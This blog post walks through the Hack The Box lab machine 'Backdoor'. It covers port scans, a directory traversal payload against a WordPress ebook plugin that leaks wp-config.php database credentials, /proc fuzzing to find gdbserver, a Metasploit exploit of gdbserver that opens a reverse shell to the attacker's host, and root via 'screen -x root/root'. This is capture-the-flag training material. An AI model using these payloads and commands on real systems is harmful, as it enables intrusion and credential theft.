---
layout: post
title: HTB Backdoor Walkthrough
categories: [HTB]
tags: [ wordpress, lfi, linux]
toc: true
image:
  path: /assets/images/backdoor/back.jpg
  alt: image alternative text
---

## Reconnaissance


```bash
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.129.96.68

Host is up (0.100s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1337/tcp open  waste

nmap -p 22,80,1337 -sCV -oA scans/nmap-tcpscripts 10.129.96.68

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.8.1
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Backdoor &#8211; Real-Life
|_https-redirect: ERROR: Script execution failed (use -d to debug)
1337/tcp open  waste?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## Port 80 

![http80](/assets/images/backdoor/80.png)

in the footer is says "Proudly powered by WordPress" , so i will use wpscan :

```bash
wpscan --url http://backdoor.htb --enumerate p,u --plugins-detection aggressive --api-token TOKEN


[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:31:27 <============================================================================================================================================================================================> (97783 / 97783) 100.00% Time: 00:31:27
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:                                          

[+] akismet
 | Location: http://backdoor.htb/wp-content/plugins/akismet/
 | Latest Version: 4.2.2
 | Last Updated: 2022-01-24T16:11:00.000Z
 |                       
 | Found By: Known Locations (Aggressive Detection)
 |  - http://backdoor.htb/wp-content/plugins/akismet/, status: 403
 |                      
 | [!] 1 vulnerability identified:
 |                      
 | [!] Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS)
 |     Fixed in: 3.1.5     
 |     References:        
 |      - https://wpscan.com/vulnerability/1a2f3094-5970-4251-9ed0-ec595a0cd26c
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9357
 |      - http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/
 |      - https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html
 |
 | The version could not be determined.
[+] ebook-download
 | Location: http://backdoor.htb/wp-content/plugins/ebook-download/
 | Last Updated: 2020-03-12T12:52:00.000Z
 | Readme: http://backdoor.htb/wp-content/plugins/ebook-download/readme.txt
 | [!] The version is out of date, the latest version is 1.5
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://backdoor.htb/wp-content/plugins/ebook-download/, status: 200
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Ebook Download < 1.2 - Directory Traversal
 |     Fixed in: 1.2
 |     References:
 |      - https://wpscan.com/vulnerability/13d5d17a-00a8-441e-bda1-2fd2b4158a6c
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10924
 |

```
## Shell as user

### LFI :

the ebook-download plugin LFI sounds promising so i will focus on it : 

by searching the exploit-db , i found this link : https://www.exploit-db.com/exploits/39575

```bash
[PoC]
======================================
/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
======================================
```

By using it , i’m able to read the wp-config.php file just like the POC suggests, including the database connection creds:

```bash
../../../wp-config.php../../../wp-config.php../../../wp-config.php<?php
/**
 * The base configuration for WordPress
...[snip]...
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpressuser' );

/** MySQL database password */
define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
```

i tried to  use the password "MQYBJSaD#DxG6qbm" with user admin and wordpressuser on the login page "http://backdoor.htb/wp-login.php" but with no luck .

### File System Enumeration 

i will use LFi linux payloads list from github but we get /etc/passwd and /etc/apache2/sites-enabled/000-default.conf which doesn’t returns anything interesting to me .

![http80](/assets/images/backdoor/burp.png)

because nmap didn't give me a clue about what service is running on port 1337 , i needed to find a way to know about it , and to do that in linux using this LFI i can look at the /proc directory that expose information about processes and system parameters as files .


In each numbered folder, the cmdline file has the command line user to run the process:

```bash
cat /proc/1/cmdline   
/sbin/initsplash#                        
```
to enumerate the process running on port 1337 , i need to fuzz the number after the /proc/

so i use ffuf for that :

i create a list of numbers from 1 to 1000 :

```bash
seq 1 1000 | tee list.txt
```

i run ffuf and filter repeated size using fs flag and filter words using fw flag  :

```bash

ffuf -u  http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../proc/self/cmdline -fs 139,142,136 -fw 1 -mc 200 -c 

963                     [Status: 200, Size: 243, Words: 12, Lines: 1, Duration: 725ms]
971                     [Status: 200, Size: 241, Words: 11, Lines: 1, Duration: 1113ms]
977                     [Status: 200, Size: 198, Words: 8, Lines: 1, Duration: 1104ms]
988                     [Status: 200, Size: 188, Words: 3, Lines: 1, Duration: 1245ms]

```
## Hunt For 1337 
checking ffuf output one by one using curl reveals the service running on port 1337 :

```bash

curl -s http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php\?ebookdownloadurl\=../../../../../../../proc/971/cmdline -o- | tr '\000' ' ' | cut -c115- | sed 's/<script>*.//g'

n/sh -c while true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done indow.close()</script>

```
gbdserver is a tool used to facilitate debugging of programs running on a remote target

## Exploiting gdbserver 

To exploit gdbserver but i will use metasploit:

```bash
msf6 > search gdb

Matching Modules
================

   #  Name                                            Disclosure Date  Rank       Check  Description
   -  ----                                            ---------------  ----       -----  -----------
   0  exploit/multi/gdb/gdb_server_exec               2014-08-24       great      No     GDB Server Remote Payload Execution
   1  exploit/linux/local/ptrace_sudo_token_priv_esc  2019-03-24       excellent  Yes    ptrace Sudo Token Privilege Escalation


Interact with a module by name or index. For example info 1, use 1 or use exploit/linux/local/ptrace_sudo_token_priv_esc

msf6 > use 0
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/gdb/gdb_server_exec) >
```

I’ll set the rhosts, rport, and lhost and the target to x86_64 :

and we get the shell : 

```bash

msf6 exploit(multi/gdb/gdb_server_exec) > run

[*] Started reverse TCP handler on 10.10.14.6:4444 
[*] 10.10.11.125:1337 - Performing handshake with gdbserver...
[*] 10.10.11.125:1337 - Stepping program to find PC...
[*] 10.10.11.125:1337 - Writing payload at 00007ffff7fd0103...
[*] 10.10.11.125:1337 - Executing the payload...
[*] Command shell session 1 opened (10.10.14.6:4444 -> 10.10.11.125:58140 )

id
uid=1000(user) gid=1000(user) groups=1000(user)
```


## Privilege Escalation 

by enumerating the process running with root : 

```bash

ps aux | grep root --color=auto 

root        1011  0.0  0.1   7216  2848 ?        Ss   05:18   0:00 SCREEN -dmS root

```

one line caught my eye , which have screen binary running as root 


screen is a terminal multiplexer, which allows a user to open multiple windows from within a session and keep those windows running even when the user isn’t connected.

 by searching around i find that we can escalate our privilege using screen -x flag , we can get attached to a session that is already attached elsewhere. Now in this case a session is already running as root so, we can get attached to that session for getting root access.

```bash

screen -x root/root
```

![http80](/assets/images/backdoor/screen.png)